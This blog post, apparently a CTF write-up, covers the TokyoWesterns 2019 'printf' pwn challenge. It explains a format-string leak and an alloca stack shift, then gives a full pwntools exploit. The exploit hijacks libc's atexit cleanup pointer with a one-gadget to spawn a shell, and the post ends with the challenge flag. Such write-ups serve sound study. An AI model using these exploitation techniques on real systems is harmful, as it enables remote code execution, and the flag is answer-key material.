---
layout: post
title: "TokyoWesterns CTF 5th 2019: Pwn - printf"
modified: 2019-09-03
tags: twctf, twctf2019quals, pwn
---

The challange implemented a custom printf function which was called on our two inputs then the program exited. This opened a format string vulnerability, which made it possible to leak out important stack/libc/etc base addresses, but `%n` was not implemented, so we could not write the memory.

Fortunately for us, it used an uncontrolled `alloca` aka. `sub rsp, rax` where the parameter was the predicted output buffer length which could be controlled by us using constructs like `%1000d` which generated a 1000 byte length buffer on the stack with `alloca`.

This made possible to set `rsp` to any lower memory address, and even write into libc's memory.

Somehow a bunch of pages which included also pointers were not read-only on Ubuntu 19.04 with libc 2.29. This was a weird behavior as the situation was much better on Ubuntu 18.04... I don't know why they changed it, but whatever, this made the exploitation much easier (possible)!

I tried to overwrite a bunch of targets with OneGadget RCE, but at the end I replaced `_IO_cleanup` in the `libc_atexit` array which was called at the exit :D

```
pwndbg> telescope &__elf_set___libc_atexit_element__IO_cleanup__ 10
00:0000│   0x7ffff7fbf6c8 (__elf_set___libc_atexit_element__IO_cleanup__) —▸ 0x7ffff7e6af50 (_IO_cleanup) ◂— push   r15
```

Here is my full exploit:

{% highlight python %}
from pwn import *

REMOTE = True
if REMOTE:
    p = remote('printf.chal.ctf.westerns.tokyo', 10001)
else:
    p = process('./printf')
    print 'pid = %r' % p.pid

print "%lx "*40

p.sendlineafter("What's your name?", "%lx "*60)
p.recvline()
p.recvline()
leakStr = p.recvline()
leaks = [int(x,16) for x in leakStr.strip().split(' ')]
print '%r' % ['0x%x' % x for x in leaks]

libcBase   = leaks[ 2] - 0x7f6c93377024 + 0x7f6c9328f000 - 0x25000
bufStart   = leaks[50] - 0x7ffedbe84d40 + 0x7ffedbe84b50
prgBase    = leaks[49] - 0x5555555550d0 + 0x555555554000
ptrAddr    = libcBase - 0x7f07af04f000 + 0x7f07af210598 + 0x25000
system     = libcBase - 0x7f6c67f88000 + 0x7f6c67fb5fd0 + 0x25000
oneGadget  = libcBase + 0xe2383
stdoutGot  = prgBase + 0x5020
stdoutLibc = libcBase - 0x155555330000 + 0x155555515760 
runAtExit  = libcBase + 0x1E66C8
print 'libcBase = 0x%x, bufStart = 0x%x, prgBase = 0x%x, ptrAddr = 0x%x, stdoutGot = 0x%x, stdoutLibc = 0x%x, system = 0x%x, oneGadget = 0x%x' % (libcBase, bufStart, prgBase, ptrAddr, stdoutGot, stdoutLibc, system, oneGadget)

value = 0x414141
diff = bufStart - runAtExit - 0x223 + 0x5D + 0x20 + 6

# 0xe237f execve("/bin/sh", rcx, [rbp-0x70])
# constraints:
#   [rcx] == NULL || rcx == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
# 
# 0xe2383 execve("/bin/sh", rcx, rdx)
# constraints:
#   [rcx] == NULL || rcx == NULL
#   [rdx] == NULL || rdx == NULL
# 
# 0xe2386 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
# 
# 0x106ef8 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
payload = "%"+str(diff)+"d"+"A"*3+"B"*8+"C"*(8+5)+"D"*6+p64(oneGadget)+"E"*2
print 'payload (len=%d) = %r' % (len(payload), payload)

if not REMOTE:
    print "waiting..."
    raw_input()

p.sendlineafter("Do you leave a comment?", payload)
p.interactive()
{% endhighlight %}

And the flag was:

{% highlight text %}
TWCTF{Pudding_Pudding_Pudding_purintoehu}
{% endhighlight %}
